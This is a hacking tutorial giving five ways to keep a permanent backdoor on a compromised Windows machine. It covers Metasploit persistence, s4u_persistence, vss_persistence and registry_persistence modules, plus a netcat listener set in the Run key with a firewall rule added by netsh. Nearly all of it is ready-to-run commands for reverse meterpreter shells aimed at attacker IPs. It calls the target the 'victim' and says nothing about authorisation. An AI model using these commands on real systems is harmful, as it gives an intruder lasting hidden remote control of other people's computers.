5 ways to Create Permanent Backdoor in Remote PC

First take the meterpreter shell from any known exploit and bypass UAC for better results .Then   run command:
run persistence –X –i 10 –p 443 –r 192.168.0.105
-X=connect back when the system boots
-i 10=try to connect back every 10 seconds
-p 443=reverse connection port
-r ip=reverse connection ip
After successfully executing the script, reboot the system and then use exploit:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lport 443
set lhost 192.168.0.105
exploit

s4u_persistence
Creates a scheduled task that will run using service-for-user (S4U). This allows the scheduled task to run even as an unprivileged user that is not logged into the device. This will result in lower security context, allowing access to local resources only. The module requires ‘Logon as a batch job’ permissions (SeBatchLogonRight)
Now type use exploit/windows/local/s4u_persistence
msf exploit (s4u_persistence)>set payload windows/meterpreter/reverse_tcp
msf exploit (s4u_persistence)>set lhost 192.168.0.137 (IP address of kali Linux)
msf exploit (s4u_persistence)>set lport 443
msf exploit (s4u_persistence)>set trigger logon
msf exploit (s4u_persistence)>set session 2
msf exploit (s4u_persistence)>exploit 
Now after successful backdoor creation, restart the victim pc you can see the previous meterpreter session is closed and then run command:
 use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.137
exploit

VSS_PERSISTENCE
This module will attempt to create a persistent payload in a new volume shadow copy. This is based on the VSSOwn Script originally posted by Tim Tomes and Mark Baggett. This module has been tested successfully on Windows 7. In order to achieve persistence through the RUNKEY option, the user should need password in order to start session on the target machine.
First take the meterpreter shell and bypass UAC by any known technique and then background the session .Then run series of commands:
Now type use exploit/windows/local/vss_persistence
msf exploit (vss_persistence)>set runkey true
msf exploit (vss_persistence)>set schtask true
msf exploit (vss_persistence)>set rhost 192.168.222.137
msf exploit vss_persistence)>set session 2
msf exploit (vss_persistence)>exploit  
Now run exploit which will create a backdoor and will give a meterpreter session.

Now background it and use the multi handler and also set the payload with commands:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.222.135
set lport 4444
exploit
Now restart the victim system and the meterpreter session will die, and then run: exploit after restarting the system it will give a reverse meterpreter shell.

REGISTRY PERSISTENCE
This module will install a payload that is executed during boot. It will be executed either at user logon or system startup via the registry value in “CurrentVersion\Run” (depending on privilege and selected method). The payload will be installed completely in registry
First background the meterpreter session and then run commands:
Now type use exploit/windows/local/registry_persistence
msf exploit (registry_persistence)>set payload windows/meterpreter/reverse_tcp
msf exploit (registry_persistence)>set lhost 192.168.222.135 (IP address of kali Linux)
msf exploit (registry_persistence)>set lport 4545
msf exploit (registry_persistence)>set startup system
msf exploit (registry_persistence)>set session 1
msf exploit (registry_persistence)>exploit

 Now set up your system for reverse connection. Run the following commands on your msfconsole:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.222.135
set lport 4545
exploit
 Now restart the victim pc and your previous meterpreter session will die, so now run the exploit: After restarting you will get the reverse meterpreter shell as you can see in my case

NETCAT
Netcat is a featured networking utility which reads and writes data across network connections, using the TCP/IP protocol.
After getting the meterpreter shell and bypassing UAC run the following command:
upload /usr/share/windows-binaries/nc.exe C:\\Windows\\system32

Now set the registry value with the following command:
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d ‘C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe’

Now get the command shell with command:
Shell and then bypass the firewall on the victim system by adding firewall rules with shell command:
netsh advfirewall firewall add rule name=’netcat’ dir=in action=allow protocol=Tcp localport=4445

Now check whether the rules are added successfully with the command:
netsh firewall show portopening
As you can see the the firewall rule netcat is added successfully.

Now after restarting of the victim system , run the following command on the terminal:
nc  -nv 192.168.0.101 4445
Here 192.168.0.101 is the victim system you previously created backdoor and 4445 is the port you gave while setting the registry value.
After successful running the command you will get the command shell.
